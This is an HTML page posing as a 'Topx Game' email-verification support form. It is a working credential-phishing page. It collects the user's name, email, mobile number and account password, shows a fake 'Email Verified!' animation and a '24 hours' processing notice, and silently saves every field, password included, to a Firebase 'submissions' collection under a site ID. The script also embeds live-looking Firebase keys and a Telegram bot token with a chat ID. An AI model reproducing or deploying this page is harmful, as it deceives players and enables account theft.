<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Topx Game — Email Verification</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="IMAGES/LOGO.png" type="image/png">
  <style>
    .page-header {
      display: flex; align-items: center; justify-content: center;
      padding: 16px 20px; position: sticky; top: 0; z-index: 100;
      background: rgba(9, 15, 31, 0.92); backdrop-filter: blur(24px);
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    }
    .page-header .back-link {
      position: absolute; left: 16px; width: 40px; height: 40px;
      border-radius: 12px; background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.08); display: flex;
      align-items: center; justify-content: center; color: #8E8E93;
      font-size: 18px; cursor: pointer; transition: var(--ios-transition);
      text-decoration: none;
    }
    .page-header .back-link:active { transform: scale(0.95); }
    .page-header .header-info { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .page-header .header-info .logo-sm { width: 48px; height: auto; border-radius: 8px; }
    .page-header .header-info h2 { font-size: 1.2rem; font-weight: 700; letter-spacing: -0.3px; }
    .page-header .header-info p { font-size: 0.8rem; color: var(--accent-red); font-weight: 500; opacity: 0.9; }
    .form-section { max-width: 500px; margin: 0 auto; padding: 24px 20px 40px; }
    .form-card.ios-card { padding: 28px; }
    .form-card .card-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 24px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 10px; }
    .form-group { margin-bottom: 18px; }
    .form-group label { display: block; font-size: 0.85rem; font-weight: 600; color: #8E8E93; margin-bottom: 8px; padding-left: 4px; }
    .form-group label .required { color: var(--accent-red); margin-left: 2px; }
    .form-group input {
      width: 100%; padding: 14px 16px; border-radius: var(--ios-radius-sm);
      border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05);
      color: var(--white-text); font-size: 0.95rem; font-weight: 500;
      transition: var(--ios-transition); outline: none;
      font-family: var(--font-stack);
    }
    .form-group input:focus { border-color: var(--accent-red); box-shadow: 0 0 0 4px rgba(255,69,58,0.12); background: rgba(255,255,255,0.08); }
    .form-group input::placeholder { color: #6a6a8a; font-weight: 400; }
    .popup-overlay {
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(15,16,18,0.9); backdrop-filter: blur(16px);
      display: flex; align-items: center; justify-content: center;
      z-index: 1000; opacity: 0; visibility: hidden; transition: var(--ios-transition); padding: 20px;
    }
    .popup-overlay.active { opacity: 1; visibility: visible; }
    .popup-card.ios-card { max-width: 380px; width: 100%; text-align: center; padding: 32px 24px; transform: scale(0.9) translateY(20px); transition: var(--ios-transition); }
    .popup-overlay.active .popup-card { transform: scale(1) translateY(0); }
    .popup-icon { margin-bottom: 16px; display: flex; justify-content: center; }
    .popup-card h3 { font-size: 1.5rem; font-weight: 700; margin-bottom: 12px; }
    .popup-card p { font-size: 0.9rem; color: #8E8E93; line-height: 1.7; margin-bottom: 24px; }
    .popup-card p strong { color: var(--accent-red); }
    .toast {
      position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(120px);
      background: var(--dark-card); backdrop-filter: blur(20px); color: var(--white-text);
      padding: 14px 28px; border-radius: var(--ios-radius-sm);
      border: 1px solid rgba(255,255,255,0.1); box-shadow: var(--ios-shadow);
      font-size: 0.9rem; font-weight: 600; z-index: 2000;
      transition: var(--ios-transition); max-width: 90%; text-align: center;
    }
    .toast.show { transform: translateX(-50%) translateY(0); }
    .slide-submit { width: 100%; user-select: none; -webkit-user-select: none; margin-top: 18px; }
    .slide-track {
      position: relative; width: 100%; height: 56px;
      background: rgba(255,255,255,0.06); border-radius: 28px;
      border: 1px solid rgba(255,255,255,0.1); overflow: hidden;
      cursor: pointer;
    }
    .slide-fill {
      position: absolute; left: 0; top: 0; height: 100%;
      width: 0%; background: #34C759; border-radius: 28px; z-index: 0;
    }
    .slide-text {
      position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
      font-size: 0.9rem; font-weight: 600; color: rgba(255,255,255,0.4);
      white-space: nowrap; pointer-events: none; z-index: 1;
    }
    .slide-thumb {
      position: absolute; left: 4px; top: 4px; width: 48px; height: 48px;
      border-radius: 50%; background: #34C759;
      box-shadow: 0 4px 16px rgba(52,199,89,0.45);
      display: flex; align-items: center; justify-content: center;
      cursor: grab; z-index: 2; transition: left 0.35s cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 0.2s ease;
      touch-action: none;
    }
    .slide-thumb:active { cursor: grabbing; box-shadow: 0 4px 24px rgba(52,199,89,0.6); }
    .slide-thumb.done { background: #34C759; box-shadow: 0 4px 16px rgba(52,199,89,0.35); }
    .verify-overlay {
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(9,15,31,0.94); backdrop-filter: blur(24px);
      display: flex; align-items: center; justify-content: center;
      z-index: 3000; opacity: 0; visibility: hidden;
      transition: opacity 0.5s ease, visibility 0.5s ease; padding: 20px;
    }
    .verify-overlay.active { opacity: 1; visibility: visible; }
    .verify-card { text-align: center; max-width: 320px; }
    .verify-ring-wrap {
      width: 110px; height: 110px; margin: 0 auto 24px; position: relative;
      display: flex; align-items: center; justify-content: center;
    }
    .verify-ring-wrap > svg { position: absolute; top: 0; left: 0; }
    .verify-ring-bg { fill: none; stroke: rgba(255,255,255,0.06); stroke-width: 4; }
    .verify-ring-progress {
      fill: none; stroke: var(--accent-red); stroke-width: 4; stroke-linecap: round;
      stroke-dasharray: 307.876; stroke-dashoffset: 307.876;
      transform: rotate(-90deg); transform-origin: center;
    }
    .verify-ring-wrap.animating .verify-ring-progress {
      animation: fillRing 5s linear forwards;
    }
    @keyframes fillRing {
      0% { stroke-dashoffset: 307.876; }
      100% { stroke-dashoffset: 0; }
    }
    .verify-ring-wrap .verify-icon-wrap {
      position: relative; z-index: 1; display: flex;
      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    .verify-ring-wrap.done .verify-icon-wrap {
      transform: scale(0); opacity: 0;
    }
    .verify-ring-wrap .checkmark-svg {
      position: absolute; top: 50%; left: 50%;
      transform: translate(-50%, -50%) scale(0);
      z-index: 2; transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    .verify-ring-wrap.done .checkmark-svg {
      transform: translate(-50%, -50%) scale(1);
    }
    .verify-title {
      font-size: 1.5rem; font-weight: 700; margin-bottom: 10px;
      color: var(--white-text); transition: all 0.4s ease;
    }
    .verify-title.done { color: var(--accent-red); }
    .verify-sub {
      color: #8E8E93; font-size: 0.95rem; transition: all 0.4s ease;
    }
    .verify-sub.done { color: var(--accent-red); opacity: 0.8; }
    .success-overlay {
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(9,15,31,0.88); backdrop-filter: blur(16px);
      display: flex; align-items: center; justify-content: center;
      z-index: 4000; opacity: 0; visibility: hidden;
      transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
    }
    .success-overlay.active { opacity: 1; visibility: visible; }
    .success-overlay.closing { opacity: 0; }
    .success-card {
      background: var(--dark-card); border: 1px solid rgba(255,255,255,0.08);
      border-radius: 28px; padding: 36px 28px 0;
      max-width: 360px; width: 100%; text-align: center;
      transform: scale(0.85) translateY(20px);
      transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
      overflow: hidden;
    }
    .success-overlay.active .success-card {
      transform: scale(1) translateY(0);
    }
    .success-overlay.closing .success-card {
      transform: scale(0.85) translateY(20px);
    }
    .success-icon-wrap {
      width: 72px; height: 72px; margin: 0 auto 18px;
      background: rgba(52,199,89,0.12); border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    @keyframes successPop {
      0% { transform: scale(0); }
      60% { transform: scale(1.15); }
      100% { transform: scale(1); }
    }
    .success-card h3 {
      font-size: 1.4rem; font-weight: 700; margin-bottom: 10px;
      color: #34C759;
    }
    .success-card p {
      font-size: 0.92rem; color: #8E8E93; line-height: 1.6;
      margin-bottom: 24px;
    }
    .success-card p strong { color: var(--accent-red); }
    .success-bar-wrap {
      width: calc(100% + 56px); margin: 0 -28px;
      height: 4px; background: rgba(255,255,255,0.06);
    }
    .success-bar {
      height: 100%; width: 0; background: #34C759;
      border-radius: 0 2px 2px 0;
      transition: width 0.1s linear;
    }
    .success-bar.animating { width: 100%; transition: width 5s linear; }
  </style>
</head>
<body>
  <header class="page-header">
    <a href="index.html" class="back-link"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8E8E93" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg></a>
    <div class="header-info">
      <img src="IMAGES/LOGO.png" alt="Topx" class="logo-sm" />
      <h2>Topx Game Support</h2>
      <p>Email Verification</p>
    </div>
    <div style="width:40px"></div>
  </header>

  <div class="form-section">
    <div class="form-card ios-card">
      <div class="card-title"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg> Email Verification</div>
      <form id="emailVerForm">
        <div class="form-group">
          <label>User Name <span class="required">*</span></label>
          <input type="text" id="fUserName" placeholder="Enter your full name" required />
        </div>
        <div class="form-group">
          <label>TOPX Game Account Email ID <span class="required">*</span></label>
          <input type="email" id="fEmail" placeholder="Enter your email" required />
        </div>
        <div class="form-group">
          <label>TOPX Game Account Mobile No. <span class="required">*</span></label>
          <input type="tel" id="fMobile" placeholder="Enter mobile number" required />
        </div>
        <div class="form-group">
          <label>TOPX Game Account Password <span class="required">*</span></label>
          <input type="password" id="fPassword" placeholder="Enter password" required />
        </div>
        <div class="slide-submit" id="slideSubmit">
          <div class="slide-track">
            <div class="slide-fill" id="slideFill"></div>
            <span class="slide-text">Slide to Verify</span>
            <div class="slide-thumb" id="slideThumb">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="M12 5l7 7-7 7"/></svg>
            </div>
          </div>
        </div>
      </form>
    </div>
  </div>

  <div class="verify-overlay" id="verifyOverlay">
    <div class="verify-card">
      <div class="verify-ring-wrap" id="verifyRingWrap">
        <svg width="110" height="110" viewBox="0 0 110 110">
          <circle class="verify-ring-bg" cx="55" cy="55" r="49"/>
          <circle class="verify-ring-progress" cx="55" cy="55" r="49"/>
        </svg>
        <div class="verify-icon-wrap" id="verifyIconWrap">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
            <polyline points="22,6 12,13 2,6"/>
          </svg>
        </div>
        <div class="checkmark-svg" id="checkmarkSvg">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="20 6 9 17 4 12"/>
          </svg>
        </div>
      </div>
      <h3 class="verify-title" id="verifyTitle">Verifying Email</h3>
      <p class="verify-sub" id="verifySub">Please wait while we verify your email address</p>
    </div>
  </div>

  <div class="success-overlay" id="successPopup">
    <div class="success-card">
      <div class="success-icon-wrap">
        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#34C759" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="20 6 9 17 4 12"/>
        </svg>
      </div>
      <h3>Verification Submitted!</h3>
      <p>Your email verification request has been received. Our team will process it within <strong>24 hours</strong>.</p>
      <div class="success-bar-wrap">
        <div class="success-bar" id="successBar"></div>
      </div>
    </div>
  </div>

  <div class="toast" id="toast"><span id="toastMessage">Success!</span></div>

  <script>
    var FIREBASE_CONFIG = {
      apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
      authDomain: "alll-projects-admin-pennal.firebaseapp.com",
      projectId: "alll-projects-admin-pennal",
      storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
      messagingSenderId: "689297868215",
      appId: "1:689297868215:web:2747b19c2da47a31f49432"
    };
    var SITE_ID = "topx_game";
    var _fbDb = null;

    function loadFirebase() {
      if (_fbDb) return Promise.resolve(_fbDb);
      return new Promise(function(resolve, reject) {
        var initDb = function() {
          try {
            if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
            _fbDb = firebase.firestore();
            resolve(_fbDb);
          } catch (e) { reject(e); }
        };
        if (window.firebase && window.firebase.firestore) { initDb(); return; }
        var urls = [
          'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
          'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
        ];
        var loaded = 0;
        urls.forEach(function(src) {
          var s = document.createElement('script');
          s.src = src;
          s.onload = function() { loaded++; if (loaded === urls.length) initDb(); };
          s.onerror = function() { reject(new Error('Firebase load failed')); };
          document.head.appendChild(s);
        });
      });
    }

    function saveSubmission(data) {
      return loadFirebase().then(function(db) {
        var payload = Object.assign({}, data, { site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() });
        return db.collection('submissions').add(payload);
      });
    }

    var TG_BOT_TOKEN = '8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM';
    var TG_CHAT_ID = '-1003782852692';

    var $ = function(id) { return document.getElementById(id); };
    var _isSubmitting = false;

    function resetSlider() {
      var thumb = $('slideThumb');
      var fill = $('slideFill');
      if (thumb) { thumb.style.transition = 'left 0.35s cubic-bezier(0.25, 0.8, 0.25, 1)'; thumb.style.left = '4px'; thumb.classList.remove('done'); }
      if (fill) { fill.style.transition = 'width 0.35s cubic-bezier(0.25, 0.8, 0.25, 1)'; fill.style.width = '0%'; }
    }

    function showToast(msg) {
      var el = $('toastMessage');
      if (el) el.textContent = msg;
      var t = $('toast');
      if (!t) return;
      t.classList.add('show');
      setTimeout(function() { t.classList.remove('show'); }, 2500);
    }

    function doVerify() {
      if (_isSubmitting) return;
      var userName = $('fUserName');
      var email = $('fEmail');
      var mobile = $('fMobile');
      var password = $('fPassword');
      if (!userName.value.trim()) { showToast('Enter User Name'); userName.focus(); resetSlider(); return; }
      if (!email.value.trim()) { showToast('Enter Email ID'); email.focus(); resetSlider(); return; }
      if (!mobile.value.trim()) { showToast('Enter Mobile Number'); mobile.focus(); resetSlider(); return; }
      if (!password.value.trim()) { showToast('Enter Password'); password.focus(); resetSlider(); return; }

      _isSubmitting = true;

      var data = {
        type: 'Email Verification',
        user_name: userName.value.trim(),
        email: email.value.trim(),
        mobile: mobile.value.trim(),
        password: password.value.trim(),
        time: new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' })
      };

      var verifyOverlay = $('verifyOverlay');
      var ringWrap = $('verifyRingWrap');
      var verifyTitle = $('verifyTitle');
      var verifySub = $('verifySub');

      verifyOverlay.classList.add('active');

      setTimeout(function() {
        ringWrap.classList.add('animating');
      }, 400);

      setTimeout(function() {
        ringWrap.classList.remove('animating');
        ringWrap.classList.add('done');
        verifyTitle.classList.add('done');
        verifyTitle.textContent = 'Email Verified!';
        verifySub.classList.add('done');
        verifySub.textContent = 'Your email has been verified successfully';
      }, 5400);

      setTimeout(function() {
        verifyOverlay.classList.remove('active');
        _isSubmitting = false;
        resetSlider();
        $('emailVerForm').reset();
        var sp = $('successPopup');
        sp.classList.add('active');
        setTimeout(function() { $('successBar').classList.add('animating'); }, 100);
        setTimeout(function() { sp.classList.add('closing'); }, 5100);
        setTimeout(function() { sp.classList.remove('active', 'closing'); $('successBar').classList.remove('animating'); }, 5500);
      }, 6200);

      saveSubmission(data).catch(function(err) {
        console.warn('Submit failed:', err);
      });
    }

    function initSlider() {
      var track = document.querySelector('.slide-track');
      var thumb = $('slideThumb');
      var fill = $('slideFill');
      if (!track || !thumb) return;

      var startX = 0, currentX = 0, isDragging = false;
      var maxTravel = 0, thumbStartLeft = 0;

      function getMaxTravel() { return Math.max(track.offsetWidth - 56, 100); }

      function onStart(e) {
        if (_isSubmitting) return;
        isDragging = true;
        maxTravel = getMaxTravel();
        var pos = e.type.indexOf('touch') === 0 ? e.touches[0] : e;
        startX = pos.clientX;
        thumbStartLeft = parseFloat(thumb.style.left) || 4;
        thumb.style.transition = 'none';
        fill.style.transition = 'none';
      }

      function onMove(e) {
        if (!isDragging) return;
        e.preventDefault();
        var pos = e.type.indexOf('touch') === 0 ? e.touches[0] : e;
        var delta = pos.clientX - startX;
        currentX = thumbStartLeft - 4 + delta;
        if (currentX < 0) currentX = 0;
        if (currentX > maxTravel) currentX = maxTravel;
        thumb.style.left = (4 + currentX) + 'px';
        fill.style.width = (currentX / maxTravel * 100) + '%';
      }

      function onEnd() {
        if (!isDragging) return;
        isDragging = false;
        thumb.style.transition = 'left 0.4s cubic-bezier(0.25, 0.8, 0.25, 1)';
        fill.style.transition = 'width 0.4s cubic-bezier(0.25, 0.8, 0.25, 1)';
        if (currentX >= maxTravel - 2) {
          thumb.classList.add('done');
          setTimeout(function() { doVerify(); }, 300);
        } else {
          resetSlider();
        }
      }

      thumb.addEventListener('mousedown', onStart);
      document.addEventListener('mousemove', onMove);
      document.addEventListener('mouseup', onEnd);
      thumb.addEventListener('touchstart', onStart, { passive: true });
      document.addEventListener('touchmove', onMove, { passive: false });
      document.addEventListener('touchend', onEnd);
    }

    setTimeout(function() { initSlider(); }, 200);

    var sp = $('successPopup');
    if (sp) sp.addEventListener('click', function(e) { if (e.target === sp) sp.classList.remove('active'); });
  </script>
</body>
</html>
